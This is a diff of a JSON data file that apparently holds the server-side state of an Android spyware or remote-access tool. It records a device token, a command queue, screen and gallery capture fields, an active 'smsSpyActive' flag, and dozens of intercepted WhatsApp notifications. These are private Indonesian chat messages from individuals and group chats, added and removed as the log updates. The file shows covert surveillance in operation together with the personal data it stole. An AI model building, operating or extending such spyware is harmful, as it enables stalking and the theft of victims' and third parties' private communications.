@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777173688988,
+    "lastSeen": 1777173704154,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Memeriksa pesan baru",
+        "time": "26/04 11:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173706392
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1254 pesan dari 19 chat",
+        "time": "26/04 11:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173704146
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "jas",
+        "content": "📡 Undangan admin saluran",
+        "time": "26/04 11:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173704140
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1249 pesan dari 19 chat",
+        "time": "26/04 11:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173703951
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "jas",
+        "content": "dapet salam dari mantan",
+        "time": "26/04 11:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173703947
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1251 pesan dari 19 chat",
+        "time": "26/04 11:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173703940
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3971,54 +4019,6 @@
         "time": "26/04 11:20",
         "pkg": "com.whatsapp",
         "receivedAt": 1777172956302
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎1074 pesan dari 19 chat",
-        "time": "26/04 11:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777172948581
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎[𝐃𝐖𝐁] 𝐃𝐀𝐄𝐑𝐀𝐇 𝐖𝐎𝐍𝐆 𝐁𝐀𝐂𝐎𝐓 || 𝐍𝐄𝐖 𝐄𝐑𝐀 (83 pesan): ~ n mpruy😂",
-        "content": "gwehj gagal ketemu mita🙃💔",
-        "time": "26/04 11:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777172948330
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎[𝐃𝐖𝐁] 𝐃𝐀𝐄𝐑𝐀𝐇 𝐖𝐎𝐍𝐆 𝐁𝐀𝐂𝐎𝐓 || 𝐍𝐄𝐖 𝐄𝐑𝐀 (82 pesan): ~ kla",
-        "content": "😭😭😭😭",
-        "time": "26/04 11:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777172947937
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOK AXEL 17 STR #1 (48 pesan): ~ Fluxo Cruel",
-        "content": "Log mt",
-        "time": "26/04 11:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777172947933
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (23 pesan): ~ el",
-        "content": "greget ee",
-        "time": "26/04 11:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777172947672
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎[𝐃𝐖𝐁] 𝐃𝐀𝐄𝐑𝐀𝐇 𝐖𝐎𝐍𝐆 𝐁𝐀𝐂𝐎𝐓 || 𝐍𝐄𝐖 𝐄𝐑𝐀 (81 pesan): ~ kla",
-        "content": "💟 Stiker",
-        "time": "26/04 11:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777172947667
       }
     ],
     "galleryPhotos": [],
